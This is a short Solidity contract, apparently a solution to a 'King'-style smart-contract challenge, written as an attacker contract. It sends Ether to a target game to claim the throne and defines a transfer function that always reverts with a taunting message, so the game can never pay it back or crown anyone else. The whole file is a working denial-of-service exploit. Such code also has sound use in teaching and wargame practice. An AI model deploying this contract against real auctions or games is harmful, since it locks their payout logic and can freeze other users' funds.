// SPDX-License-Identifier: MIT
pragma solidity ^0.7.4;

contract TheKing {
    
    function becomeTheKing(address payable _game) external payable {
        (bool sent, bytes memory data) = _game.call{
            value: msg.value
        }("");
        
        require(sent, "Failed to send Ether");
    }
    
    function transfer(uint _value) external {
        revert("My evel plan worked!!! I am the only king. Kneel before me!");   
    }
    
}
